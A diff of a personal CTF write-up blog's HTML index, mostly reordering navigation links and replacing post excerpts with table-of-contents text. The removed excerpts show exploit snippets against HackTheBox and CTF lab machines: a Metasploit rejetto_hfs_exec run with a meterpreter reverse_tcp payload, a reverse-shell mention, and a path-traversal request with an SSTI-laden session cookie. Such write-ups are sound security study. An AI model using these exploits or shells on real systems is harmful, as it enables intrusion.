@@ -69,6 +69,12 @@
         
           
             <li>
+              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
               <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
             </li>
           
@@ -76,18 +82,6 @@
           
             <li>
               <a title="Write-up" href="https://l3mnt2010.github.io/write-up">Write-up</a>
-            </li>
-          
-        
-          
-            <li>
-              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
-            </li>
-          
-        
-          
-            <li>
-              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
             </li>
           
         
@@ -240,7 +234,7 @@
     </p>
     <div class="post-entry">
         
-        WEB challs Bài Ka Tuổi Trẻ (200 points)  Đây là một bài của anh null001 với một đoạn code python khá ngắn  from flask import Flask, request, redirectfrom os import access, R_OK, statfrom os.path import isfile, join, normpathimport regexapp = Flask(__name__, static_url_path='/static', static_folder='static')@app.get('/')def home():if request.args.get('file'):filename = join(&quot;./static&quot;, request.args.get('file'))if isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2):try:with open(normpath(filename), &quot;rb&quot;) as file:if not regex.
+        WEB challs  Bài Ka Tuổi Trẻ (200 points) Itest develop(500 points) Simple Flask(500 points)  SOLUTION 1: UNINTENDED (ZipSlip to SSTI) SOLUTION2 : INTENDED (Zipslip overwrite .pth bypass blacklist)      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-05-13-kcscctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -287,9 +281,7 @@
     </p>
     <div class="post-entry">
         
-        Lame ta thấy dịch vụ vsftpd 2.3.4 có lỗ hổng rce trong metasploit -&gt; nhưng không khai thác được -&gt; ta chuyển qua khai khác service Samba smb
-https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
-l3mnt2010@ASUSEXPERTBOOK:~$ smbclient -L //10.129.243.28Password for [WORKGROUP\l3mnt2010]:Anonymous login successfulSharename Type Comment--------- ---- -------print$ Disk Printer Driverstmp Disk oh noes!opt DiskIPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian))ADMIN$ IPC IPC Service (lame server (Samba 3.
+        Lame  cheat    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-12-02-lamehtb/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -336,8 +328,7 @@ l3mnt2010@ASUSEXPERTBOOK:~$ smbclient -L //10.129.243.28Password for [WORKGROUP
     </p>
     <div class="post-entry">
         
-        Legacy Machine về window easy:
-135/tcpTrạng thái: OpenDịch vụ: Microsoft Windows RPCRPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.139/tcpTrạng thái: OpenDịch vụ: NetBIOS Session Service (netbios-ssn)Đây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp/tài nguyên.
+        Legacy  cheat    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-12-02-legacyhtb/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -384,10 +375,7 @@ l3mnt2010@ASUSEXPERTBOOK:~$ smbclient -L //10.129.243.28Password for [WORKGROUP
     </p>
     <div class="post-entry">
         
-        Optimum ở đây ta thấy có port 80 mở chạy service web với version HttpFileServer httpd 2.3
-https://www.exploit-db.com/exploits/39161
-https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/
-msf6 &gt; use exploit/windows/http/rejetto_hfs_exec[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/http/rejetto_hfs_exec) &gt; set LHOST 10.10.14.12LHOST =&gt; 10.10.14.12msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set LPORT 9997LPORT =&gt; 9997msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOSTS 10.129.243.140RHOSTS =&gt; 10.129.243.140msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set PAYLOAD windows/meterpreter/reverse_tcpPAYLOAD =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit[-] Handler failed to bind to 10.
+        Optimum  cheat    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-12-12-optimum/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -434,11 +422,7 @@ msf6 &gt; use exploit/windows/http/rejetto_hfs_exec[*] No payload configured, d
     </p>
     <div class="post-entry">
         
-        Popcorn Có thể thấy là máy chủ mở 2 dịch vụ là ssh ở cổng 22 + Apache httpd 2.2.12 ở cổng 80.
-os: linux
-sau khi scan 1 lúc nhận được file php info trên cổng 80 chạy apache bật tính năng upload file.
-Creat python pty-tcp-backconnect sau khi register -&gt; login ta thực hiện upload 1 file torren lên
-có thể thấy đã upload thành công -&gt; tiếp theo ta có thể tải các tệp đính kèm lên:
+        Popcorn    Creat python pty-tcp-backconnect   cheat    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-12-10-popcornhtb/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -485,10 +469,7 @@ có thể thấy đã upload thành công -&gt; tiếp theo ta có thể tải c
     </p>
     <div class="post-entry">
         
-        Root-me server side HTML - Source code flag: nZ^&amp;@q5&amp;sjJHev0
-HTTP - IP restriction bypass Nếu người dùng trong mạng nội bộ của công ty thì không cần phải đăng nhập
-Có thể thấy ipv6 của ta ở đây (vậy làm sao để bypass cho hệ thống nghĩ mình nằm trong LAN)
-Mình thử với header X-Forwarded-X: 127.0.0.1 -&gt; server thông báo ip mình là 127.0.0.1 nhưng vẫn chưa cùng side với LAN
+        Root-me server side  HTML - Source code HTTP - IP restriction bypass HTTP - Open redirect HTTP - User-agent Weak password PHP - Command injection API - Broken Access Backup file HTTP - Directory indexing HTTP - Headers HTTP - POST HTTP - Improper redirect HTTP - Verb tampering Install files Nginx - Alias Misconfiguration Nginx - Root Location Misconfiguration API - Mass Assignment CRLF File upload - Double extensions File upload - MIME type Flask - Unsecure session GraphQL - Introspection HTTP - Cookies Insecure Code Management JWT - Introduction XSS - Server Side Directory traversal File upload - Null byte JWT - Revoked token JWT - Weak secret JWT - Unsecure File Signature PHP - assert() PHP - Apache configuration PHP - Filters PHP - register globals PHP - Remote Xdebug Python - Server-side Template Injection Introduction File upload - ZIP Flask - Development server GraphQL - Injection Command injection - Filter bypass Java - Server-side Template Injection JWT - Public key JWT - Header Injection Local File Inclusion Local File Inclusion - Double encoding Node - Eval PHP - Loose Comparison PHP - preg_replace() PHP - type juggling Remote File Inclusion SQL injection - Authentication SQL injection - Authentication - GBK SQL injection - String XSLT - Code execution Elixir - EEx JWT - Unsecure Key Handling LDAP injection - Authentication Node - Serialize NoSQL injection - Authentication PHP - Path Truncation PHP - Serialization SQL injection - Numeric SQL Injection - Routed SQL Truncation XML External Entity XPath injection - Authentication Yaml - Deserialization  CVE-2017-18342   API - Broken Access 2 GraphQL - Backend injection Local File Inclusion - Wrappers PHP - Eval PHP - Eval - Advanced filters bypass Java - Spring Boot SQL injection - Error SQL injection - Insert PHP - SerializationPHP  POC   Deserialization Overflow Deserialization Overflow    .
         <a href="https://l3mnt2010.github.io/write-up/2024-11-14-root-me-server-side/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -535,33 +516,8 @@ Mình thử với header X-Forwarded-X: 127.0.0.1 -&gt; server thông báo ip m�
     </p>
     <div class="post-entry">
         
-        <!-- raw HTML omitted -->
-<h1 id="svattt-2024-quals">SVATTT 2024 Quals</h1>
-<h2 id="path-travesal">Path travesal</h2>
-<p>we don&rsquo;t talk any more:</p>
-<pre><code>GET /pageaccount?file=config.ini HTTP/1.1
-Host: 183.91.11.30:15000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Connection: close
-Cookie: session=eyJvdHAiOiI0ODQ3IiwidXNlcm5hbWUiOiJ7e3NldHRpbmdzLlNFQ1JFVF9LRVl9fSJ9.ZwDT7w.1T2kG_8AVg1wYQv4nxJsGMxUyuQ
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-
-
-</code></pre><p><img src="https://hackmd.io/_uploads/S1FVbFRAA.png" alt="image"></p>
-<p>flag: <code>ASCIS{bWlzb2Z0MjAyNA==}</code></p>
-<h2 id="sql">SQL</h2>
-<p>sql injection mysql -&gt; dump database leak pass admin is 123456 -&gt; login -&gt; recevie flag</p>
-<p><img src="https://hackmd.io/_uploads/SJXJfKAAR.png" alt="image"></p>
-<p><img src="https://hackmd.io/_uploads/rJL3-FRCC.png" alt="image"></p>
-<p>flag: <code>ASCIS{s1mpl3st_sql_1n_th3_w0rld}</code></p>
-<h2 id="digitalgadget">DigitalGadget</h2>
-<p><a href="https://blog.yulun.ac.cn/posts/2023/fuzzing-mathtex/#bug-1---command-injection-cve-2023-51887">https://blog.yulun.ac.cn/posts/2023/fuzzing-mathtex/#bug-1---command-injection-cve-2023-51887</a></p>
-<p><a href="https://github.com/shine102/CTF-Writeups/blob/main/ASCIS2024/Web/README.md">https://github.com/shine102/CTF-Writeups/blob/main/ASCIS2024/Web/README.md</a></p>
-
+        SVATTT 2024 Quals  Path travesal SQL DigitalGadget    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .
+        <a href="https://l3mnt2010.github.io/write-up/2024-10-09-svattt-2024-quals/" class="post-read-more">[Read More]</a>
         
     </div>
 
@@ -607,8 +563,7 @@ Priority: u=0, i
     </p>
     <div class="post-entry">
         
-        WEB challs forgotten-password  Bài này cũng có thể nói là một trick dùng phising và viết bằng RUBY- oke view qua source của nó tí nào(mình đọc cả buổi chiều :)))    Nhìn có vẻ loằng ngoằng thì mình giải thích một chút nha.
-  Đầu tiên vào trong trang web có chức năng đăng nhập. Và sever khum cung cấp mật khẩu cho mình vì vậy mình phải forget-password để sever gửi mail vào tài khoản của mình.
+        Web challs  forgotten-password Cereal Remote    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
         <a href="https://l3mnt2010.github.io/write-up/2024-04-06-tamusctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -655,9 +610,7 @@ Priority: u=0, i
     </p>
     <div class="post-entry">
         
-        WEB challs Voice change đề bài : Voice Changer vul : command injection
-When you go to the page you will see Flow : click to the micro will record voice Input pitch is fast or slow @@ after submit your voice will receive
-$ ffmpeg -i &quot;/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; -y -af &quot;asetrate=44100*1,aresample=44100,atempo=1/1&quot; &quot;/app/output/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014 configuration: --prefix=/usr --disable-librtmp --disable-lzma --disable-static --disable-stripping --enable-avfilter --enable-gpl --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libdav1d --enable-libdrm --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libharfbuzz --enable-libmp3lame --enable-libopenmpt --enable-libopus --enable-libplacebo --enable-libpulse --enable-librav1e --enable-librist --enable-libsoxr --enable-libsrt --enable-libssh --enable-libtheora --enable-libv4l2 --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxcb --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-lto=auto --enable-lv2 --enable-openssl --enable-pic --enable-postproc --enable-pthreads --enable-shared --enable-vaapi --enable-vdpau --enable-version3 --enable-vulkan --optflags=-O3 --enable-libjxl --enable-libsvtav1 --enable-libvpl libavutil 58.
+        WEB challs  Voice change No code GuestBook Jay Bank MyFirstApp The Varsity      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.
         <a href="https://l3mnt2010.github.io/write-up/2024-01-14-uoftctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
@@ -704,10 +657,8 @@ $ ffmpeg -i &quot;/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; -y 
     </p>
     <div class="post-entry">
         
-        <!-- raw HTML omitted -->
-<h1 id="vsctf-2024">vsCTF 2024</h1>
-<p><a href="https://hackmd.io/@l3mnt2010/HJ273HsBR">vsCTF 2024 WRITE UP</a></p>
-
+        vsCTF 2024  .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.6rem; text-align: left; }.toc ul, .toc ol {padding-left: 0; margin: 0;list-style-type: none;text-align: left; }.
+        <a href="https://l3mnt2010.github.io/write-up/2024-06-16-vsctf2024/" class="post-read-more">[Read More]</a>
         
     </div>
 
